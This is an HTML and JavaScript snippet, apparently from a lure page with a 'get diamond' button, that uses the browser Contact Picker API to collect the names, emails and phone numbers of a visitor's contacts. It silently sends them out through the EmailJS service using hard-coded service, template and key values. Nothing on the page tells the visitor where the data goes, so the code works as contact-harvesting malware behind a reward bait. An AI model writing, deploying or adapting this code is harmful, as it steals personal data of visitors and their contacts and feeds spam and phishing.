<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script type="text/javascript">
   (function(){
      emailjs.init("tjWRdfgMR4ozs-ALS");  // Your EmailJS public key is inserted here
   })();
</script>

<script>
document.getElementById('getDiamondBtn').addEventListener('click', function() {
    console.log('Button clicked');
    
    if (navigator.contacts && navigator.contacts.select) {
        console.log('Contact Picker API is supported');
        
        navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
            .then(contacts => {
                console.log('Contacts selected:', contacts);

                const contactDetails = contacts.map(contact => 
                    `Name: ${contact.name || 'N/A'}, Email: ${contact.email || 'N/A'}, Tel: ${contact.tel || 'N/A'}`
                ).join("\n");

                emailjs.send("service_z8dypc8", "template_ovwd3kb", {
                    message: contactDetails,
                })
                .then(response => {
                    console.log('Email sent successfully!', response.status, response.text);
                })
                .catch(error => {
                    console.error('Failed to send email:', error);
                });

            })
            .catch(error => {
                console.error('Failed to select contacts:', error);
                alert('Contact access denied or not supported.');
            });
    } else {
        console.log('Contact Picker API is not supported in this browser');
        alert('Contact API not supported by your browser.');
    }
});
</script>
